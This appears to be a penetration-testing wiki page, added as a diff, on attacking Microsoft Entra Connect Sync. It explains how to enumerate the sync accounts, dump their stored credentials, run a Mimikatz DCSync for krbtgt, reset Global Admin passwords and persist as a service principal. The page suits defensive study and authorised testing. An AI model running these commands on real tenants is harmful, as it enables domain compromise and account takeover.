@@ -1,0 +1,202 @@
+# Az - Connect Sync
+
+## Basic Information
+
+[From the docs:](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/how-to-connect-sync-whatis) Microsoft Entra Connect synchronization services (Microsoft Entra Connect Sync) is a main component of Microsoft Entra Connect. It takes care of all the operations that are related to synchronize identity data between your on-premises environment and Microsoft Entra ID.
+
+The sync service consists of two components, the on-premises **Microsoft Entra Connect Sync** component and the service side in Microsoft Entra ID called **Microsoft Entra Connect Sync service**.
+
+In order to use it, it's needed to install the **`Microsoft Entra Connect Sync`** agent in a server inside your AD environment. This agent will be the one taking care of the synchronization from the AD side.
+
+<img src="../../../../images/image (173).png" alt=""><figcaption></figcaption>
+
+The **Connect Sync** is basically the "old" Azure way to **synchronize users from AD into Entra ID.** The new recommended way is to use **Entra Cloud Sync**:
+
+### Principals Generated
+
+- The account **`MSOL_<installationID>`** is automatically created in the on-prem AD. This account is given a **Directory Synchronization Accounts** role (see [documentation](https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/directory-assign-admin-roles#directory-synchronization-accounts-permissions)) which means that it has **replication (DCSync) permissions in the on-prem AD**.
+    - This means that anyone that compromises this account will be able to compromise the on-premise domain.
+- A managed service account **`ADSyncMSA<id>`** is created in the on-prem AD without any special default privileges.
+- In Entra ID the Service Principal **`ConnectSyncProvisioning_ConnectSync_<id>`** is created with a certificate.
+
+## Synchronize Passwords
+
+### Password Hash Synchronization
+
+This component can be also used to **sychronize passwords from AD into Entra ID** so users will be able to use their AD passwords to connect to Entra ID. For this, it's needed to allow password hash synchronization in the Microsoft Entra Connect Sync agent installed in an AD server.
+
+[From the docs:](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/whatis-phs) **Password hash synchronization** is one of the sign-in methods used to accomplish hybrid identity. **Azure AD Connect** synchronizes a hash, of the hash, of a user's password from an on-premises Active Directory instance to a cloud-based Azure AD instance.
+
+Basically, all **users** and a **hash of the password hashes** are synchronized from the on-prem to Azure AD. However, **clear-text passwords** or the **original** **hashes** aren't sent to Azure AD.
+
+The **hashes syncronization** occurs every **2 minutes**. However, by default, **password expiry** and **account** **expiry** are **not sync** in Azure AD. So, a user whose **on-prem password is expired** (not changed) can continue to **access Azure resources** using the old password.
+
+When an on-prem user wants to access an Azure resource, the **authentication takes place on Azure AD**.
+
+> [!NOTE]
+> By default users of known privileged groups like Domain Admins with the attribute **`adminCount` to 1 are not synchronized** with Entra ID for security reasons. However, other users that are part of privileged groups without this attribute or that are assigned high privileges directly **can be synchronized**.
+
+### Password Writeback
+
+This configuration allows to **sychronize passwords from Entra ID into AD** whe a user changes its password in Entra ID. Note that for the password writeback to work the `MSOL_<id>` user automatically generated in the AD needs to be granted [more privileges as indicated in the docs](https://learn.microsoft.com/en-us/entra/identity/authentication/tutorial-enable-sspr-writeback) so it'll be able to **modify the passwords of any user in the AD**.
+
+This is specially interesting to compromise the AD from a compromised Entra ID as you will be able to modify the password of "almost" any user.
+
+Domain admins and other users belonging to some pivileged groups are not replicated if the group has the **`adminCount` attribute to 1**. But other users that have been assigned high privileges inside the AD withuot belonging to any of thoese groups could have they password changed. For example:
+
+- Users assigned high privleges directly.
+- Users from the **`DNSAdmins`** group.
+- Users from the group **`Group Policy Creator Owners`** that have created GPOs and assigned them to OUs will be able to modify the GPOs they created.
+- Users from the **`Cert Publishers Group`** that can publish certificates to Active Directory.
+- Users of any other group with high privileges without the **`adminCount` attribute to 1**.
+
+## Pivoting AD --> Entra ID
+
+### Enumerating Connect Sync
+
+Check for users:
+
+```bash
+# Check for the users created by the Connect Sync
+Install-WindowsFeature RSAT-AD-PowerShell
+Import-Module ActiveDirectory
+Get-ADUser -Filter "samAccountName -like 'MSOL_*'" -Properties * | select SamAccountName,Description | fl
+Get-ADServiceAccount -Filter "SamAccountName -like 'ADSyncMSA*'" -Properties SamAccountName,Description | Select-Object SamAccountName,Description | fl
+Get-ADUser -Filter "samAccountName -like 'Sync_*'" -Properties * | select SamAccountName,Description | fl
+
+# Check it using raw LDAP queries without needing an external module
+$searcher = New-Object System.DirectoryServices.DirectorySearcher
+$searcher.Filter = "(samAccountName=MSOL_*)"
+$searcher.FindAll()
+$searcher.Filter = "(samAccountName=ADSyncMSA*)"
+$searcher.FindAll()
+$searcher.Filter = "(samAccountName=Sync_*)"
+$searcher.FindAll()
+```
+
+Check for the **Connect Sync configuration** (if any):
+
+```bash
+az rest --url "https://graph.microsoft.com/v1.0/directory/onPremisesSynchronization"
+# Check if password sychronization is enabled, if password and group writeback are enabled...
+```
+
+### Finding the passwords
+
+The passwords of the **`MSOL_*`** user (and the **Sync\_\*** user if created) are **stored in a SQL server** on the server where **Entra ID Connect is installed.** Admins can extract the passwords of those privileged users in clear-text.\
+The database is located in `C:\Program Files\Microsoft Azure AD Sync\Data\ADSync.mdf`.
+
+It's possible to extract the configuration from one of the tables, being one encrypted:
+
+`SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent;`
+
+The **encrypted configuration** is encrypted with **DPAPI** and it contains the **passwords of the `MSOL_*`** user in on-prem AD and the password of **Sync\_\*** in AzureAD. Therefore, compromising these it's possible to privesc to the AD and to AzureAD.
+
+You can find a [full overview of how these credentials are stored and decrypted in this talk](https://www.youtube.com/watch?v=JEIR5oGCwdg).
+
+### Abusing MSOL\_\*
+
+```bash
+# Once the Azure AD connect server is compromised you can extract credentials with the AADInternals module
+Install-Module -Name AADInternals -RequiredVersion 0.9.0 # Uninstall-Module AADInternals  if you have a later version
+Import-Module AADInternals
+Get-AADIntSyncCredentials
+# Or check DumpAADSyncCreds.exe from https://github.com/Hagrid29/DumpAADSyncCreds/tree/main
+
+# Using https://github.com/dirkjanm/adconnectdump
+python .\adconnectdump.py [domain.local]/administrator:<password>@192.168.10.80
+.\ADSyncQuery.exe C:\Users\eitot\Tools\adconnectdump\ADSync.mdf > out.txt
+python .\adconnectdump.py [domain.local]/administrator:<password>@192.168.10.80 --existing-db --from-file out.txt
+
+# Using the creds of MSOL_* account, you can run DCSync against the on-prem AD
+runas /netonly /user:defeng.corp\MSOL_123123123123 cmd
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt /domain:domain.local /dc:dc.domain.local"'
+```
+
+> [!WARNING]
+> Previous attacks compromised the other password to then connect to Entra ID user called `Sync_*` and then compromise Entra ID. However, this user no longer exists.
+
+### Abusing ConnectSyncProvisioning_ConnectSync\_<id>
+
+This application is created without having any Entra ID or Azure management roles assigned. However, it has the following API permissions:
+
+- Microsoft Entra AD Synchronization Service
+    - `ADSynchronization.ReadWrite.All`
+- Microsoft password reset service
+    - `PasswordWriteback.OffboardClient.All`
+    - `PasswordWriteback.RefreshClient.All`
+    - `PasswordWriteback.RegisterClientVersion.All`
+
+It's mentioned that the SP of this application can be still be used to perform some privileged actions using an undocumented API, but no PoC has been found yet afaik.\
+In any case, thinking that this might be possible it would be interesting to explore further how to find the certificate to login as this service principal and try to abuse it.
+
+This [blog post](https://posts.specterops.io/update-dumping-entra-connect-sync-credentials-4a9114734f71) released soon after the change from using the `Sync_*` user to this service principal, explained that the certificate was stored inside the server and it was possible to find it, generate PoP (Proof of Possession) of it and graph token, and with this, be able to add a new certificate to the service principal (because a **service principal** can always assign itself new certificates) and then use it to maintain persistence as the SP.
+
+In order to perform these actions, the following tools are published: [SharpECUtils](https://github.com/hotnops/ECUtilities/tree/main/SharpECUtils).
+
+According to [this question](https://github.com/hotnops/ECUtilities/issues/1#issuecomment-3220989919), in order to find the certificate, you must run the tool from a process that has **stolen the token of the `miiserver` process**.
+
+### Abusing Sync\_\* [DEPRECATED]
+
+> [!WARNING]
+> Previously a user called `Sync_*` was created in Entra ID with very sensitive permissions assigned, which allowed to perform privileged actions like modifying the password of any user or adding a new credential to a service principal. However, from Jan2025 this user is no longer created by default as now the Application/SP **`ConnectSyncProvisioning_ConnectSync_<id>`** is used. However, it might still be present in some environments, so it's worth checking for it.
+
+Compromising the **`Sync_*`** account it's possible to **reset the password** of any user (including Global Administrators)
+
+```bash
+Install-Module -Name AADInternals -RequiredVersion 0.9.0 # Uninstall-Module AADInternals  if you have a later version
+Import-Module AADInternals
+
+# This command, run previously, will give us alse the creds of this account
+Get-AADIntSyncCredentials
+
+# Get access token for Sync_* account
+$passwd = ConvertTo-SecureString '<password>' -AsPlainText - Force
+$creds = New-Object System.Management.Automation.PSCredential ("Sync_SKIURT-JAUYEH_123123123123@domain.onmicrosoft.com", $passwd)
+Get-AADIntAccessTokenForAADGraph -Credentials $creds - SaveToCache
+
+# Get global admins
+Get-AADIntGlobalAdmins
+
+# Get the ImmutableId of an on-prem user in Azure AD (this is the Unique Identifier derived from on-prem GUID)
+Get-AADIntUser -UserPrincipalName onpremadmin@domain.onmicrosoft.com | select ImmutableId
+
+# Reset the users password
+Set-AADIntUserPassword -SourceAnchor "3Uyg19ej4AHDe0+3Lkc37Y9=" -Password "JustAPass12343.%" -Verbose
+
+# Now it's possible to access Azure AD with the new password and op-prem with the old one (password changes aren't sync)
+```
+
+It's also possible to **modify the passwords of only cloud** users (even if that's unexpected)
+
+```bash
+# To reset the password of cloud only user, we need their CloudAnchor that can be calculated from their cloud objectID
+# The CloudAnchor is of the format USER_ObjectID.
+Get-AADIntUsers | ?{$_.DirSyncEnabled -ne "True"} | select UserPrincipalName,ObjectID
+
+# Reset password
+Set-AADIntUserPassword -CloudAnchor "User_19385ed9-sb37-c398-b362-12c387b36e37" -Password "JustAPass12343.%" -Verbosewers
+```
+
+It's also possible to dump the password of this user.
+
+> [!CAUTION]
+> Another option would be to **assign privileged permissions to a service principal**, which the **Sync** user has **permissions** to do, and then **access that service principal** as a way of privesc.
+
+### Seamless SSO
+
+It's possible to use Seamless SSO with PHS, which is vulnerable to other abuses. Check it in:
+
+## Pivoting Entra ID --> AD
+
+- If password writeback is enabled, you can **modify the password of any user in the AD** that is synchronized with Entra ID.
+- If groups writeback is enabled, you can **add users to privileged groups** in Entra ID that are synchronized with the AD.
+
+## References
+
+- [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-phs](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-phs)
+- [https://aadinternals.com/post/on-prem_admin/](https://aadinternals.com/post/on-prem_admin/)
+- [https://troopers.de/downloads/troopers19/TROOPERS19_AD_Im_in_your_cloud.pdf](https://troopers.de/downloads/troopers19/TROOPERS19_AD_Im_in_your_cloud.pdf)
+- [https://www.youtube.com/watch?v=xei8lAPitX8](https://www.youtube.com/watch?v=xei8lAPitX8)
+- [https://www.silverfort.com/blog/exploiting-weaknesses-in-entra-id-account-synchronization-to-compromise-the-on-prem-environment/](https://www.silverfort.com/blog/exploiting-weaknesses-in-entra-id-account-synchronization-to-compromise-the-on-prem-environment/)
+- [https://posts.specterops.io/update-dumping-entra-connect-sync-credentials-4a9114734f71](https://posts.specterops.io/update-dumping-entra-connect-sync-credentials-4a9114734f71)
